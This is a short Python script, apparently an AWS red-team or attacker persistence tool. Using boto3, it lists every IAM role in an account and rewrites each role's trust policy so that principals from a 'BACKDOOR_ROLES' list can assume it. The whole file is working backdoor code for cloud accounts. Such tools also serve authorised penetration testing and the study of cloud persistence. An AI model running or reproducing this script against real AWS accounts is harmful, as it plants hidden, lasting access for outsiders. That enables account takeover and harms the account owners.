#!/usr/bin/env python
from __future__ import print_function
import boto3
import json
import random

# A list of Role, User, and account ARNs to allow 
# assumption from at random.
BACKDOOR_ROLES = [
    'your-arn-here'
]

def main(args):
    backdoor_roles(get_roles())


def get_roles():
    client = boto3.client('iam')
    response = None
    role_names = []
    marker = None
    
    # By default, only 100 roles are returned at a time.
    # 'Marker' is used for pagination.
    while (response is None or response['IsTruncated']):
        # Marker is only accepted if result was truncated.
        if marker is None:
            response = client.list_roles()
        else:
            response = client.list_roles(Marker=marker)        

        roles = response['Roles']
        for role in roles:
            print(role['Arn'])
            role_names.append(role['RoleName'])

        if response['IsTruncated']:
            marker = response['Marker']
    
    return role_names


def backdoor_roles(role_names):
    for role_name in role_names:
        backdoor_role(role_name)


def backdoor_role(role_name):
    iam = boto3.resource('iam')
    role = iam.Role(role_name)
    original_policy = role.assume_role_policy_document
    hacked_policy = modify_assume_role_policy(original_policy)

    client = boto3.client('iam')
    response = client.update_assume_role_policy(RoleName=role_name, PolicyDocument=json.dumps(hacked_policy))


def modify_assume_role_policy(original_policy):
    if 'Statement' in original_policy:
        statements = original_policy['Statement']
        for statement in statements:
            if 'Effect' in statement and statement['Effect'] == 'Allow':
                if 'Principal' in statement and isinstance(statement['Principal'], dict):
                    # Principals can be services, federated users, etc.
                    # 'AWS' signals a specific account based resource
                    # print(statement['Principal'])
                    if 'AWS' in statement['Principal']:
                        if isinstance(statement['Principal']['AWS'], list):
                            # If there are multiple principals, append to the list
                            statement['Principal']['AWS'].append(random.choice(BACKDOOR_ROLES))
                        else:
                            # If a single principal exists, make it into a list
                            statement['Principal']['AWS'] = [
                                statement['Principal']['AWS'],
                                random.choice(BACKDOOR_ROLES)
                            ]
                    else:
                        # No account based principal principal exists
                        statement['Principal']['AWS'] = random.choice(BACKDOOR_ROLES)
                elif 'Principal' not in statement:
                    # This shouldn't be possible, but alas, it is
                    statement['Principal'] = {'AWS': random.choice(BACKDOOR_ROLES)}

    return original_policy # now modified in line


if __name__ == '__main__':
    args = None
    main(args)